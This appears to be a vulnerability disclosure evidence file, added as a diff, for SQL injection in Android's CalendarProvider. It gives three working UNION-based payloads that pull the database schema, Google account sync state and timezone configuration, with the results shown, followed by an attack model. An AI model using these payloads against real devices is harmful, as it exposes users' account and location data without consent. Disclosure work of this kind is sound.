@@ -1,0 +1,39 @@
+=== CalendarProvider SQL Injection - Evidence ===
+Date: 2026-09-07
+Device: Pixel 6a (26131JEGR04733), Android 17 (API 37), Build CP2A.260605.012
+
+VULNERABILITY: SQL Injection in CalendarProvider's selection parameter
+COMPONENT: com.android.providers.calendar (AOSP CalendarProvider)
+URI: content://com.android.calendar/calendars
+IMPACT: Read internal database tables not exposed through ContentProvider API
+
+PROOF 1 - Schema Extraction:
+Payload: 1=0) UNION SELECT sql,2,3,...,35 FROM sqlite_master WHERE type='table'--
+Result: Full database schema extracted (15 tables)
+
+PROOF 2 - _sync_state Table Access (Sync Tokens):
+Payload: 1=0) UNION SELECT account_name||'|'||account_type||'|'||data,2,3,...,35 FROM _sync_state--
+Result: Google account sync tokens exposed:
+  - Account: sandiyotest@gmail.com|com.google
+  - Sync window: 1822176000000
+  - Last sync: 2026-04-14T16:15:22.948Z / 1788724078146
+  - Calendar subscriptions including Indian holiday calendars
+  - do_incremental_sync state
+
+PROOF 3 - CalendarCache Internal State:
+Payload: 1=0) UNION SELECT key||'='||value,2,3,...,35 FROM CalendarCache--
+Result: Internal configuration exposed:
+  - timezoneDatabaseVersion=2025c
+  - timezoneInstances=Asia/Kolkata (user location indicator)
+  - timezoneType=auto
+
+ATTACK MODEL:
+Any app with READ_CALENDAR permission can exploit this SQL injection to:
+1. Extract sync state data including Google account sync tokens
+2. Extract full database schema
+3. Access internal tables not exposed through the public API
+4. Bypass view restrictions (e.g., lastSynced filter)
+5. Extract user timezone/location information
+
+This data is NOT accessible through the normal CalendarProvider API, 
+even with READ_CALENDAR permission granted.
